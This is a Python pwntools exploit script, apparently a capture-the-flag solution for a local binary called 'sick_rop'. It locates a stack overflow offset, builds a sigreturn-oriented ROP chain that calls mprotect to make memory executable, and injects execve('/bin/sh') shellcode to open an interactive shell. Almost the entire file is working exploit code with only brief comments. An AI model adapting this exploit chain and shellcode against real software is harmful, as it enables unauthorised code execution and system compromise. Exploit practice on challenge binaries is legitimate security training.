from pwn import *
import pprint
exe = './sicrop/sick_rop'
elf = context.binary = ELF(exe, checksec=True)
rop = ROP(exe)
pprint.pprint(rop.gadgets)
#context.log_level = 'debug'

def findoffset(path,size,after):
    #target=process(path, stdin=PTY, stdout=PTY, stderr=PTY)
    target=process(path)
    target.send(cyclic(size))
    target.wait()
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(target.corefile.rbp)+8 # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset
#findoffset(exe,300,'>>')
shellcode = (b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05") # 23B // From shellstrorm
syscall = 0x401014 #syscall_ret gadget
info(hex(elf.symbols['vuln']))
vuln_function  = p64(0x40102e)
vuln_pointer = 0x4010d8 #From pwndgb search command
# pwndbg> search -4 0x40102e
# Searching for a 4-byte integer: b'.\x10@\x00'
# sick_rop        0x4010d8 adc byte ptr cs:[rax], al
writable = 0x400000 # Program startpoint

frame = SigreturnFrame(kernel="amd64")
frame.rax = 10 #Mprotect for syscall table
frame.rdi = writable #Writable memory segment
frame.rsi = 0x4000 #Size
frame.rdx = 7 #Read/Write/Exectable access
frame.rsp = vuln_pointer # Usually best in this cases to use a pointer to an address.
frame.rip = syscall #Calling the syscall in the end
payload1 = b"A"*40 + vuln_function + p64(syscall) + bytes(frame)
p = process(exe)
p.sendline(payload1)
p.recv()
#gdb.attach(p)
payload = b"C"*15 # send() not sendline() 15 bytes for proper alignment kernel expects 15 bytes when processing the sigreturn system call (syscall number = 0xf). Check syscall table for unix
p.send(payload)
p.recv()
payload3 = shellcode + b"\x90"*17 + p64(0x00000000004010b8)
p.send(payload3)
p.recv()
# gdb.attach(p)
p.interactive()
